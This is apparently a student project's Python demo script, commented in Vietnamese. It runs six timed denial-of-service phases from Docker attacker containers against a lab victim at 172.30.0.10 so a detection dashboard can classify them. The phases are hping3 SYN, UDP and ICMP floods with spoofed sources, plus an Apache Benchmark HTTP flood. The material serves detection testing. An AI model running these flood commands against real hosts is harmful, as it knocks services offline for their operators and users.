#!/usr/bin/env python3
"""Script chay tu dong 1 luot TOAN BO cac kich ban tan cong (cuong do toi da bang hping3 va ab).

Thiet ke rieng cho buoi DEMO / Bao ve PBL3:
  - KHONG dung cac script Python paced nua, ma dung thang cong cu cuc dai (hping3, ab).
  - KHONG dong cham hay tat detector cua Dashboard -> Dashboard http://localhost:3000 van chay lien tuc.
  - Tuan tu chay 6 kich ban tieu bieu (L3/L4/L7, DoS vs DDoS), giua cac pha co cooldown de
    Dashboard chuyen doi truc quan tu DO/CAM tro ve XANH (BENIGN).
"""
import argparse
import os
import signal
import subprocess
import sys
import time

VICTIM = "172.30.0.10"
ATTACKERS = ["attacker1", "attacker2", "attacker3", "attacker4", "attacker5", "attacker6"]

# Mau sac terminal
CLR_RESET = "\033[0m"
CLR_BOLD = "\033[1m"
CLR_RED = "\033[91m"
CLR_GREEN = "\033[92m"
CLR_YELLOW = "\033[93m"
CLR_CYAN = "\033[96m"
CLR_MAGENTA = "\033[95m"

PHASES = [
    {
        "id": "1",
        "name": "DoS TCP SYN Flood (1 nguon)",
        "tool": "hping3 -S --flood (attacker1)",
        "layer": "L4 Transport",
        "verdict": "DoS (Banner Cam)",
        "vector": "SYN Flood (L4)",
        "target_desc": "1 nguon duy nhat ban SYN toi tap -> n_src = 1, H(src) = 0, pps/syn tang manh",
        "mode": "syn_dos",
    },
    {
        "id": "2",
        "name": "DDoS TCP SYN Flood (6 nguon + IP Spoofing)",
        "tool": "hping3 -S --flood --rand-source (attacker1..6)",
        "layer": "L4 Transport",
        "verdict": "DDoS (Banner Do)",
        "vector": "SYN Flood (L4)",
        "target_desc": "6 botnet gia lap hang nghin IP ao -> n_src nhay vot, H(src) > 10 bits",
        "mode": "syn_ddos",
    },
    {
        "id": "3",
        "name": "DoS UDP Flood (1 nguon)",
        "tool": "hping3 --udp --flood (attacker1)",
        "layer": "L4 Transport",
        "verdict": "DoS (Banner Cam)",
        "vector": "UDP Flood (L4)",
        "target_desc": "1 nguon ban UDP line-rate -> Do thi UDP/s nhay vot, SYN/ACK = 0",
        "mode": "udp_dos",
    },
    {
        "id": "4",
        "name": "DDoS UDP Flood (6 nguon + IP Spoofing)",
        "tool": "hping3 --udp --flood --rand-source (attacker1..6)",
        "layer": "L4 Transport",
        "verdict": "DDoS (Banner Do)",
        "vector": "UDP Flood (L4)",
        "target_desc": "Volumetric flood UDP gia mao IP -> Bang thong day, H(src) cao",
        "mode": "udp_ddos",
    },
    {
        "id": "5",
        "name": "DDoS ICMP Echo Flood (Ping Flood L3)",
        "tool": "hping3 --icmp --flood --rand-source (attacker1..6)",
        "layer": "L3 Network",
        "verdict": "DDoS (Banner Do)",
        "vector": "Volumetric / ICMP Flood (L3)",
        "target_desc": "Ping flood dồn dập -> pps cao nhung TCP/UDP = 0, h_dport = 0",
        "mode": "icmp_ddos",
    },
    {
        "id": "6",
        "name": "DDoS HTTP Flood (L7 Application Layer)",
        "tool": "Apache Benchmark (ab -k -c 100) tu 6 attacker",
        "layer": "L7 Application",
        "verdict": "DDoS (Banner Do)",
        "vector": "HTTP Flood (L7)",
        "target_desc": "Ket noi TCP hoan tat (ACK >> SYN), rate_per_src rat cao, kiệt quệ Nginx",
        "mode": "http_ddos",
    },
]


def kill_attackers():
    """Dung toan bo cac tien trinh tan cong tren attacker1..6."""
    for a in ATTACKERS:
        subprocess.run(["docker", "exec", a, "pkill", "-9", "-f", "hping3"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["docker", "exec", a, "pkill", "-9", "-f", "ab"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def sig_handler(sig, frame):
    print(f"\n{CLR_RED}[!] Nhan tin hieu dung (Ctrl+C). Dang dọn dẹp các tiến trình tấn công...{CLR_RESET}")
    kill_attackers()
    sys.exit(0)


def launch_phase(ph, dur):
    mode = ph["mode"]
    procs = []

    if mode == "syn_dos":
        cmd = ["docker", "exec", "attacker1", "timeout", str(dur), "hping3", "-S", "-p", "80", "-q", "--flood", VICTIM]
        procs.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

    elif mode == "syn_ddos":
        for a in ATTACKERS:
            cmd = ["docker", "exec", a, "timeout", str(dur), "hping3", "-S", "-p", "80", "-q", "--rand-source", "--flood", VICTIM]
            procs.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

    elif mode == "udp_dos":
        cmd = ["docker", "exec", "attacker1", "timeout", str(dur), "hping3", "--udp", "-p", "80", "-q", "--flood", VICTIM]
        procs.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

    elif mode == "udp_ddos":
        for a in ATTACKERS:
            cmd = ["docker", "exec", a, "timeout", str(dur), "hping3", "--udp", "-p", "80", "-q", "--rand-source", "--flood", VICTIM]
            procs.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

    elif mode == "icmp_ddos":
        for a in ATTACKERS:
            cmd = ["docker", "exec", a, "timeout", str(dur), "hping3", "--icmp", "-q", "--rand-source", "--flood", VICTIM]
            procs.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

    elif mode == "http_ddos":
        for a in ATTACKERS:
            cmd = ["docker", "exec", a, "timeout", str(dur), "ab", "-k", "-c", "100",
                   "-t", str(dur), "-n", "100000000", f"http://{VICTIM}/"]
            procs.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

    return procs


def main():
    signal.signal(signal.SIGINT, sig_handler)
    signal.signal(signal.SIGTERM, sig_handler)

    ap = argparse.ArgumentParser(description="Chay toan bo kich ban tan cong cuong do cao cho Dashboard Demo")
    ap.add_argument("--dur", type=int, default=15, help="Thoi luong moi pha tan cong (giay, mac dinh 15s)")
    ap.add_argument("--gap", type=int, default=6, help="Khoang nghi giua cac pha de Dashboard tro ve BENIGN (giay, mac dinh 6s)")
    ap.add_argument("--only", choices=["1", "2", "3", "4", "5", "6"], default=None, help="Chi chay 1 pha cu the (1..6)")
    args = ap.parse_args()

    # In banner mo dau
    print(f"\n{CLR_CYAN}{CLR_BOLD}" + "=" * 76)
    print("      DEMO TỔNG HỢP CÁC KỊCH BẢN TẤN CÔNG (HPING3 & AB - LINE-RATE)")
    print("      Theo dõi trực quan thời gian thực tại: http://localhost:3000")
    print("=" * 76 + f"{CLR_RESET}\n")

    kill_attackers()

    phases_to_run = [p for p in PHASES if p["id"] == args.only] if args.only else PHASES
    total = len(phases_to_run)

    for idx, ph in enumerate(phases_to_run, 1):
        print(f"\n{CLR_BOLD}────────────────────────────────────────────────────────────────────────────{CLR_RESET}")
        print(f"{CLR_BOLD}[{idx}/{total}] KỊCH BẢN #{ph['id']}: {CLR_YELLOW}{ph['name']}{CLR_RESET}")
        print(f"  • Công cụ     : {CLR_CYAN}{ph['tool']}{CLR_RESET}")
        print(f"  • Tầng giao thức: {ph['layer']}")
        print(f"  • Phán quyết kỳ vọng: {CLR_GREEN}{ph['verdict']}{CLR_RESET}  |  Vector: {CLR_MAGENTA}{ph['vector']}{CLR_RESET}")
        print(f"  • Dấu hiệu Web: {ph['target_desc']}")
        print(f"{CLR_BOLD}────────────────────────────────────────────────────────────────────────────{CLR_RESET}")

        print(f"{CLR_RED}>>> ĐANG BẮN LƯU LƯỢNG CỰC ĐẠI ({args.dur}s)... Hãy quan sát Dashboard!{CLR_RESET}", flush=True)
        procs = launch_phase(ph, args.dur)

        # Dem nguoc thoi gian tan cong
        for remaining in range(args.dur, 0, -1):
            sys.stdout.write(f"\r    [Tấn công]: Còn {remaining:2d}s ... ")
            sys.stdout.flush()
            time.sleep(1)
        print("\r    [Tấn công]: Hoàn tất!                       ")

        kill_attackers()
        for p in procs:
            try:
                p.wait(timeout=1)
            except Exception:
                pass

        if idx < total:
            print(f"\n{CLR_GREEN}>>> COOLDOWN ({args.gap}s): Ngắt lưu lượng để Dashboard trở về BENIGN (Xanh)...{CLR_RESET}")
            for g in range(args.gap, 0, -1):
                sys.stdout.write(f"\r    [Nghỉ/Hạ nhiệt]: Còn {g:2d}s ... ")
                sys.stdout.flush()
                time.sleep(1)
            print("\r    [Nghỉ/Hạ nhiệt]: Sẵn sàng cho kịch bản tiếp theo.          ")

    print(f"\n{CLR_CYAN}{CLR_BOLD}" + "=" * 76)
    print("      HOÀN TẤT TOÀN BỘ KỊCH BẢN DEMO THÀNH CÔNG!")
    print("      Hệ thống đã chứng minh khả năng phát hiện trọn vẹn L3/L4/L7.")
    print("=" * 76 + f"{CLR_RESET}\n")


if __name__ == "__main__":
    main()
